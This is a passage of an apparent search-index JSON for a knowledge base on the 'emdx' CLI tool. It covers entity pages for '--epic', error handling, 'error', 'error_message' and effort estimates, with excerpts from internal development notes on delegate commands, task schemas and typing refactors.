\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>entity type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>default_max_links = 5</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>topic articles</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>title case</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>tech_term</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>proper_noun</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>min_shared_entities = 2</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>link_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>heading_stopwords</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/epic/","title":"--epic","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-15</p>"},{"location":"entities/epic/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>12. MISSING: <code>emdx task list</code> flags not documented (line 1028-1033) <code>emdx task list</code> has <code>--status</code>, <code>--all</code>, <code>--done</code>, <code>--limit</code>, <code>--epic</code>, <code>--cat</code>, <code>--json</code> flags. The doc just shows the bare command.</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...-base-branch<code>|</code>-b<code>| TEXT | Base branch for worktree/branch (default: main) | |</code>--epic<code>|</code>-e<code>| INTEGER | Epic task ID to add tasks to | |</code>--cat<code>|</code>-c<code>| TEXT | Category key for auto-numbered tasks | |</code>--cleanup` | \u2014 | \u2014 | Remove stale delegate wor...</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...ch<code>,</code>--draft<code>,</code>--worktree<code>,</code>--base-branch<code>) are grouped under \"Git &amp; PRs\", and</code>--epic<code>/</code>--cat` under \"Organization\"</p> </li> <li> <p>Concise option descriptions \u2014 Trimmed verbose help strings (e.g. \"Use Sonnet model (shortcut for --model sonnet)\" \u2192 \"Use Sonnet...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...draft<code>,</code>--worktree<code>,</code>--base-branch<code>) are under \"Git &amp; PRs\"; organization flags (</code>--epic<code>,</code>--cat`) are under \"Organization\"</p> </li> <li> <p>Concise help strings \u2014 Every option description was tightened (e.g. \"Use Sonnet model (shortcut for --model sonnet)\" \u2192 \"Us...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...raft<code>,</code>--worktree<code>,</code>--base-branch`</p> </li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more concise</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...--branch<code>,</code>--draft<code>,</code>--worktree<code>,</code>--base-branch`</p> </li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li> <p>Improved option descriptions \u2014 cleaner, more concise text (e.g. \"Inject document content as context\" instead of \"Document ID to use as input context\"...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | **Parallel orchestration (...</p> </li> <li> <p>#6606 Delegate: Update CLAUDE.md to reflect that 'emdx epic' and 'emdx cat'    Section: Analysis</p> <p>The <code>--epic</code> and <code>--cat</code> flags on <code>emdx task add</code> (line 112, 203) are correct as-is \u2014 they're flags, not standalone commands.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Epic/Category Integration</p> Flag Short Description <code>--epic</code> <code>-e</code> Epic task ID to add tasks to <code>--cat</code> <code>-c</code> Category key for auto-numbered tasks </li> <li> <p>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2]   Section: 5. Including Tasks (Optional)</p> <p>Tasks are ephemeral work items, not knowledge. Including them adds complexity:</p> </li> <li>Would need <code>--context-tasks</code> flag to opt-in</li> <li>Mixing doc context and task context is confusing</li> <li>Tasks already have <code>--epic</code> flag for grouping</li> </ul>"},{"location":"entities/epic/#related-entities","title":"Related Entities","text":"<ul> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>grouped option panels</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx task epic list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>--flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>--cat</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=6.3)</li> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.2)</li> <li><code>--branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.0)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>_delegate_help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/error-handling/","title":"error handling","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2025-07-07</p>"},{"location":"entities/error-handling/#documents-15","title":"Documents (15)","text":"<ul> <li>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3] <p>CliResult - Direct parsing of CLI output</p> </li> <li>Log file fallback - <code>extract_token_usage_detailed(log_file)</code> for stream-json format</li> </ul>"},{"location":"entities/error-handling/#error-handling_1","title":"Error Handling","text":""},{"location":"entities/error-handling/#timeout-management","title":"Timeout Management","text":"<pre><code>deadline = start_time + config.timeout_seconds\n\nwhile True:\n...\n\n- **#6564** Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]\n  &gt; For `--branch`: agent commits, pushes (no PR)\n5. Worktree cleanup: automatic after `--pr`, retained after `--branch`\n\n### Task Tracking\n\n- Tasks created via `_safe_create_task()` (never fails delegate)\n- Tasks linked to executions via `execution_id`\n...\n\n- **#6237** Delegate synthesis [synthesis]\n  *Section: Overview*\n  &gt; This synthesis consolidates findings from 11 parallel audits covering dependency, configuration, API, dead code, security, migration, build/CI, error handling, type safety, and testing debt in the emdx project.\n\n- **#6320** Delegate: Add comprehensive test coverage for the delegate command (em\n  *Section: Test Coverage*\n  &gt; ...- --pr implying worktree (no cleanup)\n  - --synthesize flag passing\n  - No tasks error handling\n  - Numeric task resolution as doc IDs\n  - Tags flattening\n\n- **#6147** Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7]\n  *Section: Code Quality*\n  &gt; ...from commands\n2. **Lazy loading** \u2014 Embedding service loaded only when needed\n3. **Error handling** \u2014 Graceful fallbacks when embeddings unavailable\n4. **Bidirectional links** \u2014 Both forward and reverse links created\n5. **Good CLI UX** \u2014 Tree display, progress in...\n\n- **#425** Gameplan: Refactor save() Function\n  &gt; ...processing steps\n4. **Reusability**: Functions can be used by other commands\n5. **Error Handling**: More granular error handling\n6. **Code Clarity**: Each function has a single, clear purpose...\n\n- **#149** Claude Stored Procedures - Comprehensive POC\n  *Section: 5.1 What This Solves*\n  &gt; ...rname** - Use environment variables\n3. **Complex Fish Code** - Reduced by 80%\n4. **Error Handling** - Centralized in procedures\n5. **Portability** - Just run SQL file on any machine\n\n- **#18** Clauding Project Gameplan - Updated\n  *Section: Medium-term Goals (1 month)*\n  &gt; 4. **Quality Improvements**\n   - Complete migration of all SQL to use `__claude_safe_insert`\n   - Comprehensive error handling\n   - Transaction support\n   - User-friendly error messages\n\n- **#19** Clauding Project Gameplan\n  *Section: Technical Debt*\n  &gt; 3. **Error Handling**\n   - Remove all error suppression (&gt;/dev/null)\n   - Add transaction support\n   - Implement proper rollback\n   - User-friendly error messages\n\n- **#6397** Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]\n  &gt; Batch Operations\n\n```bash\n# Process multiple items from JSON array\necho '[{\"id\": 1, \"tags\": [\"done\"]}, {\"id\": 2, \"tags\": [\"done\"]}]' | emdx tag --from-json\n\n# Or file-based\nemdx tag --from-file batch.json\n</code></pre>"},{"location":"entities/error-handling/#3-heredoc-friendly-content","title":"3. Heredoc-Friendly Content","text":"<p>Alread...</p> <ul> <li> <p>#6313 Delegate: Analyze BOILERPLATE &amp; REPEATED PATTERNS across emdx/ (exclud [9/15]   Section: Summary: Reduction Opportunities</p> <p>...|------------------|----------| | DB Query Boilerplate | 143 | 200+ | HIGH | | CLI Error Handling | 103 | 120 | HIGH | | Status Color Maps | 3 | 12 | LOW | | Score Thresholds | 5 | 10 | LOW | | Common CLI Options | 202 | 60 | MEDIUM | | Table Construction | 28 |...</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]</p> <p>Recommendation: Add examples to help text. ---</p> </li> </ul>"},{"location":"entities/error-handling/#medium-severity-error-handling","title":"MEDIUM SEVERITY (Error Handling)","text":""},{"location":"entities/error-handling/#11-inconsistent-error-output-formats","title":"11. Inconsistent Error Output Formats","text":"<p>Location: Throughout Issue: Error formats vary: - <code>[red]Error: {message}[/red]</code> - common - `[red]Error: Documen...</p> <ul> <li> <p>#6071 Delegate: Python Error Handling Best Practices</p> </li> <li> <p>Be specific with exceptions - Catch specific exception types (e.g., <code>ValueError</code>, <code>FileNotFoundError</code>) rather than bare <code>except:</code> or <code>except Exception:</code>.</p> </li> <li> <p>#460 EMDX Slimdown Analysis: Code Reduction Opportunities   Section: 2. Major Code Duplication Patterns</p> </li> </ul> <pre><code>except Exception as e:\n    console.print(f\"[red]Error &lt;action&gt;: {e}[/red]\")\n    raise typer.Exit(1) from e\n</code></pre> <p>Solution: Create error handling decorator</p> <ul> <li>#150 Claude Command Structure Analysis   Section: Refactoring Opportunities </li> <li>Centralized error handling function</li> <li>Consistent error message format</li> <li>Proper exit codes</li> </ul>"},{"location":"entities/error-handling/#top-3-python-best-practices-for-error-handling","title":"Top 3 Python Best Practices for Error Handling","text":""},{"location":"entities/error-handling/#error-handling-41-occurrences","title":"Error Handling (41 occurrences)","text":""},{"location":"entities/error-handling/#4-error-handling","title":"4. Error Handling","text":""},{"location":"entities/error-handling/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>{{item}}</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>recent additions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/error/","title":"error","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/error/#documents-14","title":"Documents (14)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...on_seconds<code>,</code>duration`</p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Parallel task JSON output structure showing fields from <code>ParallelResult.to_dict()</code>: <code>parent_task_id</code>, <code>task_count</code>, <code>succeeded</code>, <code>failed</code>, <code>doc_ids</code>, <code>tasks</code>...</p> </li> <li> <p>#6758 Delegate: Research how to get progress/status information from a runni   Section: 2. <code>claude --print --output-format stream-json</code> \u2014 The Key Opportunity</p> <p>...lt<code>| \u2014 | Final result with</code>duration_ms<code>,</code>total_cost_usd<code>,</code>usage<code>(tokens) | |</code>error` | \u2014 | Error details |</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Stream-JSON Format Processing</p> <p>...md}... / \ud83d\udcd6 Reading: {path} | | <code>tool_call</code> (completed) | \u2705 Tool completed / \u274c Tool error | | <code>result</code> | \u2705 Completed ({ms}) / \u274c Failed ({ms}) | | <code>error</code> | \u274c Error: {message} |</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: Architecture Decision</p> <p>Rationale:</p> </li> <li>Tasks have an <code>error</code> field that stores error messages (line 178 of <code>models/tasks.py</code>)</li> <li><code>get_failed_tasks()</code> already exists in <code>models/tasks.py</code> (line 413)</li> <li> <p><code>status.py</code> already impleme...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>Recommended Type:</p> </li> </ul> <pre><code>def _safe_update_task(\n    task_id: int | None,\n    *,\n    status: str | None = None,\n    error: str | None = None,\n    execution_id: int | None = None,\n    output_doc_id: int | None = None,\n) -&gt; None:\n</code></pre> <ul> <li>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: 1. <code>emdx/utils/git.py</code> - Added <code>validate_pr_preconditions()</code> function <p>Returns a dict with:</p> </li> <li><code>has_commits</code>: bool</li> <li><code>commit_count</code>: int</li> <li><code>is_pushed</code>: bool</li> <li><code>branch_name</code>: str</li> <li><code>files_changed</code>: int</li> <li> <p><code>error</code>: str | None</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...e in parent group | | <code>retry_of</code> | INTEGER | NULL | FK to tasks (retry chain) | | <code>error</code> | TEXT | NULL | Error message if failed | | <code>tags</code> | TEXT | NULL | Comma-separated tags |</p> </li> <li> <p>#6406 Bug Fix PR Reviews [synthesis]   Section: Summary by PR</p> <p>...masking clause, adds stage validation | | #590 | Migration rollback + UnboundLocalError | \u2705 APPROVE | Proper rollback on failure, conn initialization fixed | | #591 | UI race conditions | \u2705 APPROVE | Double-save flag + cache key with filters | | #592 |...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> </li> <li><code>list_documents()</code>: Validates limit/offset &gt;= 0 with ValueError</li> <li> <p><code>cleanup_old_executions()</code>: Validates days &gt; 0 with ValueError</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...number in parent</p> </li> <li><code>retry_of</code>: Previous attempt</li> <li><code>tags</code>: Comma-separated tags</li> <li> <p><code>error</code>: Error message</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 3. Tasks Table (<code>models/tasks.py</code>)</p> <p>...EGER | Order in parent group | | <code>retry_of</code> | INTEGER FK | For retry tracking | | <code>error</code> | TEXT | Error message if failed | | <code>tags</code> | TEXT | Comma-separated tags |</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...g children | | <code>retry_of</code> | INTEGER | NULL | FK to tasks (if this is a retry) | | <code>error</code> | TEXT | NULL | Error message if failed | | <code>tags</code> | TEXT | NULL | Comma-separated tags |</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> <ol> <li>Updates on completion (lines 242-255):</li> </ol> </li> <li>Success: <code>status=\"done\"</code>, <code>output_doc_id=doc_id</code></li> <li> <p>Failure: <code>status=\"failed\"</code>, <code>error=result.error_message</code></p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: The Detail Pane</p> <p>...s(task_id)<code>, shows</code>Blocks:` with status icons</p> </li> <li>Description \u2014 full text</li> <li>Error (if any, in red)</li> <li>Work Log \u2014 last 20 entries from <code>get_task_log()</code>, each with timestamp and message</li> <li>Execution info \u2014 execution ID and output doc ID (...</li> </ul>"},{"location":"entities/error/#3-input-validation-good","title":"3. Input Validation - \u2705 GOOD","text":""},{"location":"entities/error/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>update_task(id, **kwargs)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>cycle detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>current_step</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/errormessage/","title":"error_message","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-16</p>"},{"location":"entities/errormessage/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...<code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code></p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...ens<code>(int),</code>output_tokens<code>(int),</code>cost_usd<code>(float),</code>execution_time_ms<code>(int),</code>error_message<code>(str | None),</code>exit_code<code>(int | None),</code>cli_tool` (str)</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Timeout Management</p> <p>Timeout results in:</p> </li> <li>Process killed immediately</li> <li>Execution record marked as failed</li> <li> <p>ExecutionResult with error_message=\"Timeout after X seconds\"</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...e_name<code>,</code>pipeline_display_name<code>,</code>current_stage<code>,</code>initial_doc_title<code>,</code>doc_id<code>,</code>error_message`.</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 4. Line 152: <code>CascadeRunItem.cascade_run</code> field</p> <p>...le: str     started_at: datetime | str     completed_at: datetime | str | None     error_message: str | None</p> </li> </ul> <pre><code>\n- **#6488** Any Type Removal Analysis [1/5]\n  *Section: Occurrence 7: `cascade_run: dict[str, Any]` field*\n  &gt; class CascadeRunDict(TypedDict, total=False):\n    id: int\n    pipeline_name: str\n    pipeline_display_name: str\n    initial_doc_title: str\n    started_at: str | datetime\n    completed_at: str | datetime\n    error_message: str | None\n</code></pre>"},{"location":"entities/errormessage/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>group_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>file:</code>emdx/ui/cascade/stage_summary_bar.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/estimated-effort/","title":"estimated effort","text":"<p>Type: heading | Mentioned in: 18 documents | First seen: 2025-07-07</p>"},{"location":"entities/estimated-effort/#documents-18","title":"Documents (18)","text":"<ul> <li>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3] <p><code>text_areas.py</code> title_input \u2014 Quick win</p> </li> <li><code>group_picker.py</code> groups lists \u2014 Use existing GroupDict</li> </ul>"},{"location":"entities/estimated-effort/#estimated-effort_1","title":"Estimated Effort","text":"<p>~2-3 hours for all fixes. Most are mechanical <code>TYPE_CHECKING</code> guard additions.</p> <ul> <li> <p>#6545 Delegate Enhancement Gameplans [1/5]</p> <p>With stale gameplan:    ```bash    echo \"Test gameplan\" | poetry run emdx save --title \"Gameplan: Test\" --tags \"gameplan,active\"    # Manually backdate accessed_at in DB to test staleness    poetry run emdx next  # Should suggest 'emdx view '... <li> <p>#6544 Delegate Enhancement Gameplans [4/5]</p> <p>Write tests in <code>tests/test_wrapup.py</code></p> </li> <li> <p>Update CLAUDE.md with usage example</p> </li>"},{"location":"entities/estimated-effort/#estimated-effort_2","title":"Estimated Effort","text":"Component Lines of Code Time Data queries ~60 15 min Command implementation ~150... <ul> <li>#6543 Delegate Enhancement Gameplans [2/5] </li> </ul>"},{"location":"entities/estimated-effort/#implementation-checklist","title":"Implementation Checklist","text":"<ul> <li>[ ] Add <code>random</code> import to delegate.py</li> <li>[ ] Add <code>is_retryable_error()</code> function to unified_executor.py</li> <li>[ ] Add <code>--retry</code> / <code>-r</code> flag to <code>delegate()</code> signature</li> <li> <p>[ ] Add <code>max_retries</code> parameter to <code>_run_single()</code>...</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]</p> <p>Integration test for prime output:</p> </li> <li>Run <code>emdx delegate \"deliberately failing task\"</code> with bad prompt</li> <li>Run <code>emdx prime</code> and verify failures section appears</li> <li> <p>Run <code>emdx prime --format json</code> and verify <code>recent_failures</code> key</p> </li> <li> <p>**Manual ve...</p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]</p> <p>Edge cases: <code>bash    emdx delegate --memory 0 \"task\"  # Should skip memory    emdx delegate --memory 100 \"task\"  # Should use whatever is available</code></p> </li> <li> <p>With other flags:    ```bash    emdx delegate --memory 3 --doc 42 \"Continue th...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]</p> <p>output.py: <code>print_json</code> - Keep <code>Any</code> (intentionally permissive)</p> </li> <li>retry.py: Keep <code>Any</code> (standard decorator pattern)</li> </ul>"},{"location":"entities/estimated-effort/#estimated-effort_3","title":"Estimated Effort","text":"<ul> <li>High Priority: ~1 hour (3 files, straightforward)</li> <li> <p>Medium Priority: ~1.5 hours (3 files...</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]</p> <p>class SelectionModeHost(Protocol):     \"\"\"Protocol for widgets that support selection mode toggle.\"\"\"     def action_toggle_selection_mode(self) -&gt; None: ... ```</p> </li> </ul>"},{"location":"entities/estimated-effort/#priority-2-create-typeddicts","title":"Priority 2: Create TypedDicts","text":"<p>Add to <code>emdx/models/types.py</code>:</p> <pre><code>class TagC...\n\n- **#6464** Claude Document Templates Comprehensive Guide\n  *Section: Plan Template*\n  &gt; ## 